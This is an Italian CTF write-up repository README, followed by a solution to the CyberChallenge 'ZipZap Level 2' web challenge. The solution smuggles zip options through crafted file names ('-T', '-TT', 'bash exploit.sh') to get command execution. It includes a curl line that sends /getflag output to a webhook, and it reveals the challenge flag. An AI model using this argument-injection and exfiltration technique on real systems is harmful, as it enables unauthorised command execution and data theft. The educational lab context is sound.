# CTF Writeups & HTB Machines 💀

In questo repository archiviamo tutte le writeups di CTF (Capture The Flag) e macchine HTB (Hack The Box) che ho completato.

## Contenuti 📚
- **CTF Writeups**: Soluzioni dettagliate delle sfide CTF
- **HTB Machines**: Guide complete per le macchine Hack The Box

## Contributi 🤝
Per contribuire con un writeup, contattami via email: `luca.crippa05@gmail.com`

## Licenza ⚖️
Repository condivisa per scopi educativi. Rispetta sempre le policy delle piattaforme quando condividi materiale.

---

# Writeup: WS_1.03 - ZipZap - Level 2

## Overview
- **Categoria:** Web
- **Autore:** bonaff
- **Difficoltà:** 500
- **Stato:** Up (last checked: 17 minutes ago)
- **URL:** [http://zipzap.challs.cyberchallenge.it/](http://zipzap.challs.cyberchallenge.it/)

## Descrizione 📝
Questa challenge è una continuazione del livello 1 di ZipZap, ma con una svolta: la flag non viene più richiamata tramite symlink all'interno di un file ZIP. Invece, bisogna sfruttare la funzionalità di upload e download multiplo dei file ZIP per eseguire un comando in modo indiretto. In sostanza, bisogna invertire il processo e manipolare il comando eseguito durante il download.

## Soluzione 🎯

### 1. Preparazione dei File
L'idea è creare alcuni file con nomi particolari e uno script di exploit che invia la flag a un server esterno (ad es. tramite un webhook).

#### Creazione dei file:
- **File con nome `-T`:**
  ```bash
  touch -- '-T'
  ```
- **File con nome `-TT`:**
  ```bash
  touch -- '-TT'
  ```
- **Script di exploit:** Creare un file chiamato `bash exploit.sh` (il nome include anche spazi) contenente il comando per eseguire la richiesta al webhook. Ad esempio, in `exploit.sh` inserire:
  ```bash
  curl "https://webhook.site/your_webhook_id?$(/getflag)"
  ```
  > **Nota:** Sostituisci `your_webhook_id` con il tuo ID personale su [Webhook.site](https://webhook.site).

### 2. Creazione dell'Archivio ZIP
Una volta creati i file, comprimi tutto in un archivio ZIP mantenendo intatti i nomi speciali:
```bash
zip archivio.zip -y -- *
```
L'opzione `-y` preserva i file esattamente com'è, inclusi eventuali caratteri problematici.

### 3. Upload e Comando Inverso
- **Upload:** Carica l'archivio ZIP sul sito.
- **Download e Esecuzione:** Al momento del download, il sistema esegue internamente un comando simile a:
  ```
  zip -T -TT 'bash exploit.sh'
  ```
  In questo modo il comando esegue lo script `exploit.sh`, il quale invia una richiesta contenente la flag al tuo webhook.

### 4. Ricezione della Flag
Monitorando il tuo endpoint su Webhook.site, vedrai comparire una richiesta simile a:
```
GET /?CCIT{N0t_enOugh_Quot3s} HTTP/1.1
```
La flag estratta sarà quindi:

## Flag 🏁
```
CCIT{N0t_enOugh_Quot3s}
```

## Lezioni Apprese 📚
- **Manipolazione degli archivi ZIP:** La gestione degli upload e download di file ZIP può essere sfruttata in modo creativo per eseguire comandi indiretti.
- **Uso di nomi particolari:** L'utilizzo di nomi di file come `-T` e `-TT` può influenzare il comportamento dei comandi eseguiti sul server.
- **Esecuzione indiretta:** Combinando upload, nomi di file strategici e download, è possibile ottenere l'esecuzione di codice anche in presenza di limitazioni dirette.

## Tools Utilizzati 🛠️
- **Terminale Linux:** Per creare file, script e l'archivio ZIP.
- **Webhook.site:** Per ricevere la flag.
- **Editor di Testo:** Per modificare lo script `exploit.sh`.

---

*Writeup by Luca Crippa - Last Updated: 2024*
